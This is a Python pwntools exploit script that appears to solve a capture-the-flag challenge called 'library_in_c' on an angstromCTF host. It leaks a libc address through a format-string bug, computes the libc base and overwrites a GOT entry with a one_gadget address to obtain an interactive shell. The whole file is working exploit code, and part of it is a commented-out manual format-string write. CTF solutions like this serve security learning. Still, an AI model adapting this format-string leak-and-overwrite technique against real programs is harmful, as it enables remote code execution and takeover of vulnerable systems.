from pwn import *
import struct

one_gadget = 0x4526a

# p = process(["./library_in_c"])
libc = ELF("./libc.so.6")
context.binary = ELF("./library_in_c")
context.bits = 64

p = remote("shell.actf.co",  20201)
# p = gdb.debug(["./library_in_c"])
pad = lambda x: x + " " * (8 - (len(x) % 8))

p.sendline("%27$llx")
p.recvuntil("hello there ")

libc_main = int(p.recvline(), 16) + 3
libc_base = libc_main - libc.symbols["__libc_start_main"] - 243

target = libc_base + 0x4526a

log.info("libc_main: " + hex(libc_main - 243))
log.info("libc_base: " + hex(libc_base))

new_target = hex(target)[-8:]
# writes = [(0x601018, int(new_target[4:], 16)), (0x601020, int(new_target[:4], 16))]
# writes.sort(key=(lambda x: x[1]))
#
# log.info(writes)
#
# addr_index = 18
#
# payload = ""
# addresses = ""
# amount_written = 0
# for write in writes:
#     addresses += p64(write[0])
#     payload += "%{}x".format(write[1] - amount_written)
#     payload += "%{}lln".format(addr_index)
#     addr_index += 1
#     amount_written += write[1] - amount_written
# payload = pad(payload)
# payload += addresses

payload = fmtstr.fmtstr_split(21, {
    0x601018: target
}, write_size="short")

log.info(repr(payload))

p.sendline(pad(payload[0]) + payload[1])
p.interactive()
